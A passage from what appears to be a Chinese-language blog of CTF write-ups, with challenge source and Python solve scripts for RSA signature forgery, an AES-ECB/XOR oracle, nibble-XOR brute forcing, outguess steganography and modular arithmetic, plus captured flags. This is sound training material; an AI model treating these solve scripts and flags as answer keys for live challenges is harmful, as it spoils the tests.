builtin">int</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> getc<span class="token punctuation">(</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> getc<span class="token punctuation">(</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> c2<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>getc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># b' > Signed command: SCTF&#123;Mult1pLic4tiv3_pr0perty_of_RSA&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="corCTF"><a href="#corCTF" class="headerlink" title="corCTF"></a>corCTF</h1><h1 id="FwordCTF"><a href="#FwordCTF" class="headerlink" title="FwordCTF"></a>FwordCTF</h1><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="Leaky-Blinders"><a href="#Leaky-Blinders" class="headerlink" title="Leaky Blinders"></a>Leaky Blinders</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3.8</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad<span class="token keyword">import</span> sys<span class="token punctuation">,</span> osFLAG <span class="token operator">=</span> <span class="token string">b"FwordCTF&#123;###############################################################&#125;"</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Welcome to Enc/Dec Oracle.'''</span>key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">^</span> b<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        msg <span class="token operator">=</span> pad<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    cipher <span class="token operator">=</span> xor<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">return</span> cipher<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>k<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>    cipher <span class="token operator">=</span> xor<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> k<span class="token punctuation">)</span>    msg <span class="token operator">=</span> unpad<span class="token punctuation">(</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> msg<span class="token keyword">class</span> <span class="token class-name">Leaky_Blinders</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"Here is the encrypted flag : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>encrypt<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n1- Encrypt"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2- Decrypt"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3- Leave"</span><span class="token punctuation">)</span>                c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                    msg <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                    cipher <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> b <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Something seems leaked !"</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                    k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nKey : "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    cipher <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Ciphertext : "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    flag <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> k<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token string">b"FwordCTF"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Well done ! Here is your flag : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>FLAG<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"Wrong key."</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"Goodbye :)"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"System error."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    challenge <span class="token operator">=</span> Leaky_Blinders<span class="token punctuation">(</span><span class="token punctuation">)</span>    challenge<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="W-amp-M-CTF"><a href="#W-amp-M-CTF" class="headerlink" title="W&amp;M CTF"></a>W&amp;M CTF</h1><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="你画我猜"><a href="#你画我猜" class="headerlink" title="你画我猜"></a>你画我猜</h3><p>只会画伞 &amp; 篮球，hhh。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210829192958380.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">WMCTF&#123;x1aoma0_wants_a_girlfriend&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="WORMCON-CTF"><a href="#WORMCON-CTF" class="headerlink" title="WORMCON CTF"></a>WORMCON CTF</h1><h2 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h2><p>我丢，还没复现几个题目比赛网站打不开了，真是太糙了，之后复现一定要及时。</p><h2 id="Cryptography-1"><a href="#Cryptography-1" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="RoboXOR"><a href="#RoboXOR" class="headerlink" title="RoboXOR"></a><strong>RoboXOR</strong></h3><p>给出题目与提示</p><pre class="line-numbers language-none"><code class="language-none">Rick got a robot named &quot;XORius&quot; as a gift by his parents which activates with a key, in user manual it was written - &quot;we suggest you to use your name is X factor for ROBO ^_^&quot; so Rick followed the user manual, his bot was working fine and now started saying &quot;2506110631060d103c5a15582036045b3c075734640015580d10531e0d1c134a2f&quot;But now Rick has fear of his parents and he wants your help to understand his ROBO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>根据题意，说明书上写的是他的名字是x factor，将名字的位数按照密文的位数进行扩展再异或获得flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">0x2506110631060d103c5a15582036045b3c075734640015580d10531e0d1c134a2f</span>name <span class="token operator">=</span> <span class="token string">b"Rick"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">b'R'</span>Name <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>Name <span class="token operator">^</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># wormcon&#123;n3v3r_g0nn4_6iv3_y0u_up!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Exclusive"><a href="#Exclusive" class="headerlink" title="Exclusive"></a><strong>Exclusive</strong></h3><pre class="line-numbers language-none"><code class="language-none">SO EXCLUSIVE. MUCH ELITE. SUCH WOW.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>给出的脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">splitit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> key1<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m<span class="token punctuation">,</span> l <span class="token operator">=</span> splitit<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">^</span> key1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>l <span class="token operator">^</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> eFLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'wormcon&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span>alpha <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'</span><span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> alpha <span class="token keyword">for</span> x <span class="token keyword">in</span> FLAG<span class="token punctuation">)</span>otp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>otpm<span class="token punctuation">,</span> otpl <span class="token operator">=</span> splitit<span class="token punctuation">(</span>otp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>otp <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>    cipher<span class="token punctuation">.</span>append<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cipher = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个加密的运算应该是<code>可逆的（类似并复杂于一般的异或操作）</code>，很简单就可以分析出来，这里采用最简单的验证法来试试。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">splitit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> key1<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m<span class="token punctuation">,</span> l <span class="token operator">=</span> splitit<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">^</span> key1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>l <span class="token operator">^</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> eotp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>otpm<span class="token punctuation">,</span> otpl <span class="token operator">=</span> splitit<span class="token punctuation">(</span>otp<span class="token punctuation">)</span>c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>m <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token number">1314</span><span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>m <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就只是对这个<code>otp = int(os.urandom(1).hex(), 16)</code>产生的key进行一个简单的爆破就行了。下面是爆破的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">splitit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> key1<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m<span class="token punctuation">,</span> l <span class="token operator">=</span> splitit<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">^</span> key1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>l <span class="token operator">^</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> ealpha <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'</span>cipher <span class="token operator">=</span> <span class="token string">'a1adabc2b7acbbffb5ae86fee8edb1aeabc2e8a886a986f5e9f0eac2bbefeaeaeaf986fee8edb1aeab'</span><span class="token comment"># otp = int(os.urandom(1).hex(), 16) 随机数范围为 0~256</span><span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    otpm<span class="token punctuation">,</span> otpl <span class="token operator">=</span> splitit<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>ch<span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>ch<span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>i <span class="token keyword">in</span> alpha <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'worncon&#123;'</span><span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># worncon&#123;x0r_n1bbl3_c1ph3r_15_4_h0m3_br3w3d_c1ph3r&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">worncon&#123;x0r_n1bbl3_c1ph3r_15_4_h0m3_br3w3d_c1ph3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="DASCTF八月挑战赛"><a href="#DASCTF八月挑战赛" class="headerlink" title="DASCTF八月挑战赛"></a>DASCTF八月挑战赛</h1><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-3"><a href="#签到-3" class="headerlink" title="签到"></a>签到</h3><p>直接签到就ok了。</p><h3 id="寒王’sblog"><a href="#寒王’sblog" class="headerlink" title="寒王’sblog"></a>寒王’sblog</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;hanwang2333.gitee.io&#x2F; 你滴寒王写了blog，看看寒王不小心留下了什么信息？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831135753095.png" alt></p><pre class="line-numbers language-none"><code class="language-none">outguess -k &quot;hahahahahahaha&quot; -r flag.jpg out.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831141140777.png" alt></p><p>意料之中，flag.jpg就是他的头像，直接运行上面的命令得flag</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;50aa7fe02602264e7d8102746416cd74&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831141503166.png" alt></p><h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>比赛原题</p><p><a href="https://ctftime.org/writeup/22374">https://ctftime.org/writeup/22374</a></p><p>那第一种解题思路来想。</p><p>首先下面的这个式子是毫无疑问的</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831174555837.png" alt></p><p>然后后面的10是2的倍数，可以约去一个2剩下$5^{175}$。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831174736957.png" alt></p><p>然后用一下欧拉定理与求乘法逆元很简单就能得到flag了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""assert(len(open('flag.txt', 'rb').read()) &lt; 50)assert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') &lt;&lt; 10000).endswith(    '1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008'))"""</span>end <span class="token operator">=</span> <span class="token number">1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008</span>mod <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">**</span> <span class="token number">175</span>phi <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">**</span> <span class="token number">175</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">**</span> <span class="token number">174</span>inv <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token 